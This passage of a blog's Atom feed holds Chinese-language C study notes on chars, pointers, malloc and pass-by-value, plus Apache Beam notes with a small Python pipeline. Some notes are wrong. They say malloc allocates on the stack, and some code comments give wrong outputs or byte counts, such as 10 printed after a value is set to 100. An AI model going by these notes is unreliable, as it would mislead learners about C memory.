&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;

int main()
{
    // 區分: &#39;&#92;0&#39;, 0, &#39;0&#39;
    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;&#92;0&#39; == 0); // true
    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;0&#39; == &#39;&#92;0&#39;); // false
    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;0&#39; == 0); // false
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;單雙引號區別&lt;br /&gt;
如果用 &amp;quot;x&amp;quot; 宣告字符串變數，C 語言就會自動補 &lt;code&gt;&#92;0&lt;/code&gt;&lt;br /&gt;
如果用 &#39;x&#39; 宣告字符串變數，C 語言不會自動補 &lt;code&gt;&#92;0&lt;/code&gt;，但用 &#39;x&#39; 宣告的字符串可以進行&lt;code&gt;ASCII&lt;/code&gt;加減法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;

int main()
{
    char char1[] = &amp;quot;x&amp;quot;; // 常量，會自動補 &#92;0 結束符
    char char2[] = {&#39;x&#39;}; // 字符，必須手動補 &#92;0 結束符
    // &amp;quot;x&amp;quot; 與 &#39;x&#39; 字節佔用量
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 &#92;0
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 &#92;0
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;char 字符 ASCII 運算&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;

int main()
{
    char char1[] = &amp;quot;x&amp;quot;; // 常量，會自動補 &#92;0 結束符
    char char2[] = {&#39;x&#39;}; // 字符，必須手動補 &#92;0 結束符
    // &amp;quot;x&amp;quot; 與 &#39;x&#39; 字節佔用量
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 &#92;0
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 &#92;0

    // %c 用於輸出一個 char 字符
    printf(&amp;quot;%c&#92;n&amp;quot;, &#39;x&#39;+1); // char 運算，+1 後會變成 y
    printf(&amp;quot;%c&#92;n&amp;quot;, 65); // 輸出 A, 因為(ASCII 65 = &#39;A&#39;)
    printf(&amp;quot;%c&#92;n&amp;quot;, &#39;A&#39;+1); // 輸出 B, 因為(ASCII 65 = &#39;A&#39;)+1 = (ASCII 66 = &#39;B&#39;)
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/字符數組/" >
        </entry>
        <entry>
            <title>
                同類指針相減運算
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/同類指針相減運算/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818180158.png&quot; alt=&quot;Pasted image 20250818180158.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9};

    // 使用 &amp;amp; 運算符，提取 arr[0] 的地址存入指針變數 p1
    int *p1 = &amp;amp;arr[0];
    int *p2 = &amp;amp;arr[3];
    printf(&amp;quot;%d&#92;n&amp;quot;, *p1); // 1
    printf(&amp;quot;%d&#92;n&amp;quot;, *p2); // 7
    printf(&amp;quot;%d&#92;n&amp;quot;, *p2-*p1); // 用 * 運算符取 p2、p1 指針值做相減(7-1=6)
    printf(&amp;quot;%d&#92;n&amp;quot;, p1); // 指針相減 p2-p1 相差 14
    printf(&amp;quot;%d&#92;n&amp;quot;, p2); // 指針相減 p2-p1 相差 14
    printf(&amp;quot;%d&#92;n&amp;quot;, p2 - p1); // 指針相減 p2-p1 相差 12 個 byte (1807002288-1807002300 = 12)/4bit(int 長度) = 3 個元素的距離
    return  0;
}

// execute: clang PointerTest-2.3.3.c -o PointerTest-2.3.3 &amp;amp;&amp;amp; ./PointerTest-2.3.3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; 與 &lt;code&gt;*&lt;/code&gt; 差異&lt;br /&gt;
&lt;code&gt;&amp;amp;&lt;/code&gt; -&amp;gt; 從「變數」取址運算符&lt;br /&gt;
&lt;code&gt;*&lt;/code&gt; -&amp;gt; 從「指針」取值運算符&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818181835.png&quot; alt=&quot;Pasted image 20250818181835.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;AB 兩個選想是因為 scanf 需要以 &amp;amp; 作為賦值&lt;/p&gt;
&lt;h1 id=&quot;賦值練習題&quot; tabindex=&quot;-1&quot;&gt;賦值練習題&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818185836.png&quot; alt=&quot;Pasted image 20250818185836.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/同類指針相減運算/" >
        </entry>
        <entry>
            <title>
                二級指針(多重指針)
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/二級指針(多重指針)/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819212809.png&quot; alt=&quot;Pasted image 20250819212809.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;例題 1:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int num = 10;
    int *p1 = &amp;amp;num; // p1 指向 num 的地址
    int *p2 = p1;   // p2 也指向 num 的地址（與 p1 相同）
    printf(&amp;quot;%p&#92;n&amp;quot;, p1); // 輸出 p1（num 的地址）
    printf(&amp;quot;%p&#92;n&amp;quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）

    // 故，p2 不是二級指針，因為他還是指向 p1 的 num 地址

    // 記憶體示意圖
    // 記憶體地址    變數      值
    // 0x1000       num      10
    // 0x2000       p1       0x1000  (num的地址)
    // 0x3000       p2       0x1000  (複製p1的值，也是num的地址)
    return 0;
}

// execute: 
//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例題 2:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二重指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int num = 10;
    int *p1 = &amp;amp;num; // p1 指向 num 的地址
    int *p2 = p1;   // p2 也指向 num 的地址（與 p1 相同）
    printf(&amp;quot;%p&#92;n&amp;quot;, p1); // 輸出 p1（num 的地址）
    printf(&amp;quot;%p&#92;n&amp;quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）
    *p2 = 100; // 將 p2 所在的位址的值改為 100
    printf(&amp;quot;%d&#92;n&amp;quot;, *p2); // 100
    printf(&amp;quot;num: %d&#92;n&amp;quot;, num); // 因為 p2 取的是 num 的位址，當 *p2 賦值時，其實是修改 num 所在記憶體空間的值
    return 0;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二級指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int a = 10;
    int *p3 = &amp;amp;a;

    // 如何聲明二級指針
    // 但是此時 p4 定義的二級指針寫法錯誤
    int *p4 = &amp;amp;p3;
    printf(&amp;quot;%p&#92;n&amp;quot;, p3); // 0x16b74aadc
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p3); // 0x16b74aad0
    printf(&amp;quot;%p&#92;n&amp;quot;, p4); // 0x16b74aad0
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p4); // 0x16f05eac8(p4 的地址)

    // 正確的定義二級指針語法
    int **p5 = &amp;amp;p3;
    printf(&amp;quot;%d&#92;n&amp;quot;, *p5); // 1868049116
    printf(&amp;quot;%d&#92;n&amp;quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)

    **p5 = 100;
    printf(&amp;quot;%d&#92;n&amp;quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)
    printf(&amp;quot;%d&#92;n&amp;quot;, a); // 10(正確，**p5 = p3 指針所指向的 a 的值)
}

// execute: 
//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;二級指針只能由指針賦值，不能直接拿地址賦值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 舉例 1:
int b = 5;
int **p1 = &amp;amp;b; // 這裡出錯，因為 b 是 int 類型，就算 &amp;amp;b 也是取 int 的地址，但 **p1 是二級指針

// 正確
int b = 5;
int *pp0 = &amp;amp;b; // 需要經過一個轉換，轉換成指針形態才能賦值給二級指針
int **p1 = &amp;amp;pp0;
printf(&amp;quot;%d&#92;n&amp;quot;, **p1); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819225732.png&quot; alt=&quot;Pasted image 20250819225732.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;多級指針解引用&quot; tabindex=&quot;-1&quot;&gt;多級指針解引用&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819230308.png&quot; alt=&quot;Pasted image 20250819230308.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二級指針 -&amp;gt; 多級指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int var = 5;
    int *ptr = &amp;amp;var;
    printf(&amp;quot;%d&#92;n&amp;quot;, *ptr);
    int **pptr = &amp;amp;ptr; // 二級指針
    printf(&amp;quot;%d&#92;n&amp;quot;, **pptr);
    int ***ppptr = &amp;amp;pptr; // 三級指針
    printf(&amp;quot;%d&#92;n&amp;quot;, ***ppptr); // 三級指針解引用

    ***ppptr = 100; // 其實修改的是 var 的變數值
    // 所有引用這個地址的值都被修改了
    printf(&amp;quot;%d&#92;n&amp;quot;, *ptr); 
    printf(&amp;quot;%d&#92;n&amp;quot;, **pptr);
    printf(&amp;quot;%d&#92;n&amp;quot;, ***ppptr);
    
}

// execute: 
//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819231450.png&quot; alt=&quot;Pasted image 20250819231450.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/二級指針(多重指針)/" >
        </entry>
        <entry>
            <title>
                malloc 內存分配
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配/</id>
            <content type="html">
                &lt;p&gt;malloc&lt;br /&gt;
函數原型&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void *malloc(unsigned int size); // size 類型為無符號整型
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;無符號整型 = 0 or 正整數&lt;/p&gt;
&lt;p&gt;因為少了負數，可以將所有位元用於顯示正整數&lt;/p&gt;
&lt;p&gt;malloc 函數返回的是一個指針，所以他是一個指針函數&lt;/p&gt;
&lt;p&gt;作用: 在內存的動態儲存區(stack 區) 中分配一個長度為 size 的連續空間，並將該空間的首地址做為函數值返回，即此函數為&lt;mark&gt;指針函數&lt;/mark&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配/" >
        </entry>
        <entry>
            <title>
                malloc 內存分配 - void 指針
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配 - void 指針/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830184511.png&quot; alt=&quot;Pasted image 20250830184511.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830190855.png&quot; alt=&quot;Pasted image 20250830190855.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;

// 無類型指針

// 結構體指針
int main()
{
    int x = 10;
    int *p = &amp;amp;x;
    printf(&amp;quot;%d&#92;n&amp;quot;, *p);

    
    // 無類型的指針變數可以與其他類型的指針相賦值
    void *q = &amp;amp;x; // 無類型指針
    q = p;
    int *r = q;
    double *s = q;
    
    // int y = *q; // 無法解讀 void 指針類型的數據
    int y = *((int *)q); // 強制轉型
    printf(&amp;quot;%d&#92;n&amp;quot;, *r);
    printf(&amp;quot;%d&#92;n&amp;quot;, y);
    printf(&amp;quot;%f&#92;n&amp;quot;, *s); // 不要嘗試讀取其他類型的指針，會導致不可預期的行為
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配 - void 指針/" >
        </entry>
        <entry>
            <title>
                C 語言 pass by value
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/C 語言 pass by value/</id>
            <content type="html">
                &lt;p&gt;C 語言沒有 pass by reference, 只有 pass by value，這是語言特性&lt;/p&gt;
&lt;p&gt;就算是 pointer 也是 pass by value&lt;/p&gt;
&lt;p&gt;若要實現 pass by reference, 需借助指針的功能&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;

void setNum(int *p)
{
    *p = 10; // 解引用後修改其值
}
int main()
{
    int a=100;
    printf(&amp;quot;a: %d&#92;n&amp;quot;, a); // 100
    setNum(&amp;amp;a); // 將 a 的地址傳進 function
    printf(&amp;quot;a: %d&#92;n&amp;quot;, a); // 10
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/C 語言 pass by value/" >
        </entry>
        <entry>
            <title>
                Apache Beam
                
            </title>
            <updated>2025-12-25T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Apache Beam/Apache Beam/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#etl&quot;&gt;#etl&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#apache-beam&quot;&gt;#apache-beam&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#pipeline&quot;&gt;#pipeline&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;basics-of-the-beam-model&quot; tabindex=&quot;-1&quot;&gt;Basics of the Beam model&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/AFAqk1j.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Apache Beam是一個統一的模型, 用於定義批處理和流式數據並行處理管道。要開始使用Beam, 您需要了解一組重要的核心概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/basics/#pipeline&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;&lt;em&gt;Pipeline&lt;/em&gt;&lt;/a&gt; &lt;br /&gt;
管道是用戶設定的轉換圖, 定義了所需的數據處理操作。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/basics/#pcollection&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;&lt;em&gt;PCollection&lt;/em&gt;&lt;/a&gt;&lt;br /&gt;
PCollection - &lt;code&gt;PCollection&lt;/code&gt; 是數據集或數據流。管道處理的數據是PCollection的一部分。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/basics/#ptransform&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;&lt;em&gt;PTransform&lt;/em&gt;&lt;/a&gt; &lt;br /&gt;
PTransform - &lt;code&gt;PTransform&lt;/code&gt; （或transform）表示管道中的數據處理操作或步驟。變換應用於零個或多個 &lt;code&gt;PCollection&lt;/code&gt; 對象, 並產生零個或多個 &lt;code&gt;PCollection&lt;/code&gt; 對象。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/basics/#window&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;&lt;em&gt;Window&lt;/em&gt;&lt;/a&gt; &lt;br /&gt;
窗口 &lt;code&gt;PCollection&lt;/code&gt; 可以根據各個元素的時間戳細分為窗口。通過將集合劃分為有限集合的窗口, 窗口支持對隨時間增長的集合進行分組操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gGnioKt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bounded vs. unbounded&lt;/strong&gt;: Bounded vs. unbounded：&lt;/p&gt;
&lt;h2 id=&quot;p-collection&quot; tabindex=&quot;-1&quot;&gt;PCollection&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;PCollection&lt;/code&gt; 可以是有界的或無界的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A &lt;em&gt;bounded&lt;/em&gt; &lt;code&gt;PCollection&lt;/code&gt; is a dataset of a known&lt;br /&gt;
有界的 &lt;code&gt;PCollection&lt;/code&gt; 是一個已知的、固定大小的數據集（或者, 一個不隨時間增長的數據集）。有界數據可以通過批處理管道進行處理。&lt;/li&gt;
&lt;li&gt;An &lt;em&gt;unbounded&lt;/em&gt; &lt;code&gt;PCollection&lt;/code&gt; is a dataset that grows over time&lt;br /&gt;
無界的 &lt;code&gt;PCollection&lt;/code&gt; 是一個隨時間增長的數據集, 數據在到達時被處理。無界數據必須通過流式管道處理。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這兩個類別直覺的來自於批處理和流處理, 但這兩者在Beam中是統一的&lt;br /&gt;
有界和無界PCollections可以在同一管道中共存。如果你的runner只能支持有界PCollection, 你必須拒絕包含無界PCollection的管道。如果你的runner只針對stream&lt;br /&gt;
那麼Beam的支持代碼中有Adapter可以將所有內容轉換為針對無界(unbound)數據的API。&lt;/p&gt;
&lt;h2 id=&quot;p-transform&quot; tabindex=&quot;-1&quot;&gt;PTransform&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;PTransform&lt;/code&gt; （或transform）表示管道中的數據處理操作或步驟。變換通常應用於一個或多個輸入 &lt;code&gt;PCollection&lt;/code&gt; 對象。&lt;/p&gt;
&lt;p&gt;您以函數對象的形式提供轉換處理邏輯（通俗地稱為「用戶代碼」）, 並且您的用戶代碼應用於輸入PCollection（或多個PCollection）的每個元素。根據您選擇的管道運行器和後端, 集群中的許多不同工作者可能會並行執行用戶代碼的實例。在每個worker上運行的用戶代碼生成輸出元素, 這些元素被添加到零個或多個輸出 &lt;code&gt;PCollection&lt;/code&gt; 對象。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Source transforms&lt;br /&gt;
如 &lt;code&gt;TextIO.Read&lt;/code&gt; 和 &lt;code&gt;Create&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;Processing and conversion operations&lt;br /&gt;
處理和轉換操作, 如 &lt;code&gt;ParDo&lt;/code&gt; 、 &lt;code&gt;GroupByKey&lt;/code&gt; 、 &lt;code&gt;CoGroupByKey&lt;/code&gt; 、 &lt;code&gt;Combine&lt;/code&gt; 和 &lt;code&gt;Count&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;Outputting transforms&lt;br /&gt;
輸出轉換, 如 &lt;code&gt;TextIO.Write&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;User-defined,&lt;br /&gt;
用戶定義的、特定於應用程式的複合轉換。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;自定義函數&quot; tabindex=&quot;-1&quot;&gt;自定義函數&lt;/h2&gt;
&lt;p&gt;某些Beam操作允許您運行用戶定義的代碼作為配置轉換的一種方式。例如, 當使用 &lt;code&gt;ParDo&lt;/code&gt; 時, 用戶定義的代碼指定對每個元素應用什麼操作。對於 &lt;code&gt;Combine&lt;/code&gt; , 它指定應該如何組合值。通過使用跨語言轉換, Beam管道可以包含用不同語言編寫的UDF, 甚至可以在同一管道中包含多種語言。&lt;/p&gt;
&lt;p&gt;Beam有幾種UDF：&lt;br /&gt;
舉常用的為例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/programming-guide/#pardo&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;&lt;em&gt;DoFn&lt;/em&gt;&lt;/a&gt; &lt;br /&gt;
DoFn -每元素處理函數（用於 &lt;code&gt;ParDo&lt;/code&gt; ）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;runner&quot; tabindex=&quot;-1&quot;&gt;Runner&lt;/h2&gt;
&lt;p&gt;Beam運行器在特定平台上運行Beam管道。大多數runner都是大規模並行大數據處理系統的翻譯器或適配器, 例如Apache Flink, Apache Spark, Google Cloud Dataflow等。&lt;br /&gt;
例如, Flink runner將Beam管道轉換為Flink作業。Direct Runner在本地運行管道, 這樣您就可以測試、調試和驗證管道是否儘可能接近Apache Beam模型。&lt;/p&gt;
&lt;p&gt;有關Runner的更多信息, 請參閱以下頁面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/#choosing-a-runner&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;Choosing a Runner&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://beam.apache.org/documentation/runners/capability-matrix/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;Beam Capability Matrix&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;window&quot; tabindex=&quot;-1&quot;&gt;Window 窗口&lt;/h2&gt;
&lt;p&gt;根據其各個元素的時間戳將 &lt;code&gt;PCollection&lt;/code&gt; 細分為窗口。通過將集合劃分為有限集合的窗口, 窗口支持對無界集合的分組操作。&lt;/p&gt;
&lt;p&gt;ex:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Fixed time windows&lt;/strong&gt;&lt;br /&gt;
固定時間窗口, 表示數據流中持續時間一致、不重疊的時間間隔。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;8-2-1-strong-fixed-time-windows-strong&quot; tabindex=&quot;-1&quot;&gt;8.2.1.&lt;strong&gt;Fixed time windows&lt;/strong&gt;(固定時間窗口)&lt;/h4&gt;
&lt;p&gt;最簡單的窗口形式是使用固定時間窗口：給定可能連續更新的帶時間戳的 &lt;code&gt;PCollection&lt;/code&gt; , 每個窗口可以捕獲（例如）具有落入30秒間隔的時間戳的所有元素。&lt;/p&gt;
&lt;p&gt;固定時間窗口表示數據流中的一致持續時間、非重疊時間間隔。考慮持續時間為30秒的窗口：在unbounded &lt;code&gt;PCollection&lt;/code&gt; 中, 所有時間戳值從0：00：00到（但不包括）0：00：30的元素都屬於第一個窗口, 時間戳值從0：00：30到（但不包括）0：01：00的元素屬於第二個窗口, 依此類推。&lt;br /&gt;
&lt;img src=&quot;https://i.imgur.com/2DwJ53K.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Apache Beam/Apache Beam/" >
        </entry>
        <entry>
            <title>
                Apache Beam 研究
                
            </title>
            <updated>2025-12-25T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Apache Beam/Apache Beam 研究/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#etl&quot;&gt;#etl&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#apache-beam&quot;&gt;#apache-beam&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#pipeline&quot;&gt;#pipeline&lt;/a&gt;&lt;br /&gt;
Example code&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import sys

import apache_beam as beam
&amp;quot;&amp;quot;&amp;quot;

假設這是個用戶從什麼來源進來的資料

&amp;quot;&amp;quot;&amp;quot;

sample_dataset = [

	{&#39;id&#39;: &#39;123&#39;,  &#39;source&#39;: &#39;A&#39;}, 
	
	{&#39;id&#39;: &#39;456&#39;,  &#39;source&#39;: &#39;A&#39;}, 
	
	{&#39;id&#39;: &#39;456&#39;,  &#39;source&#39;: &#39;B&#39;}, 
	
	{&#39;id&#39;: &#39;789&#39;,  &#39;source&#39;: &#39;B&#39;}, 
	
	{&#39;id&#39;: &#39;789&#39;,  &#39;source&#39;: &#39;C&#39;}, 
	
	{&#39;id&#39;: &#39;789&#39;,  &#39;source&#39;: &#39;D&#39;}, 

]

  

if __name__ == &#39;__main__&#39;:

	with beam.Pipeline(argv=sys.argv) as pipeline:

		(
		
		pipeline
		
		| &#39;資料初始化(轉為 pcollection)&#39; &amp;gt;&amp;gt; beam.Create(sample_dataset)
		
		| &#39;每行資料轉為 (source,  1)&#39; &amp;gt;&amp;gt; beam.Map(lambda row: (row[&#39;source&#39;],  1))
		
		| &#39;同樣的 source 加總起來&#39; &amp;gt;&amp;gt; beam.CombinePerKey(sum)
		
		| &#39;轉換輸出的格式&#39; &amp;gt;&amp;gt; beam.Map(lambda row: {&#39;source&#39;: row[0],  &#39;count&#39;: row[1]})
		
		| &#39;寫入檔案&#39; &amp;gt;&amp;gt; beam.io.WriteToText(&#39;sample-output&#39;)
		
		)

&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Apache Beam/Apache Beam 研究/" >
        </entry>
</feed>
